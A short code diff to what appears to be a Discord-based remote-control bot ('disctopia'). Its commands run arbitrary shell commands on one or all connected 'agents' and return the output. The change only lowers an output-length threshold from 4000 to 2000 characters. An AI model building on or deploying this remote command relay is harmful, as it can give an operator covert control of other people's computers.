@@ -184,7 +184,7 @@ async def cmd(ctx: commands.Context):
 async def cmd(ctx: commands.Context, command:str):
     if (int(CURRENT_AGENT) == int(ID)):
         result = disctopia.cmd(command)
-        if len(result) > 4000:
+        if len(result) > 2000:
             path = os.environ["temp"] +"\\response.txt"     
             with open(path, 'w') as file:
                 file.write(result)
@@ -198,7 +198,7 @@ async def cmd(ctx: commands.Context, command:str):
 @app_commands.guilds(GUILD)
 async def cmd_all(ctx: commands.Context, command:str):
     result = disctopia.cmd(command)
-    if len(result) > 4000:
+    if len(result) > 2000:
         path = os.environ["temp"] +"\\response.txt"     
         with open(path, 'w') as file:
             file.write(result)
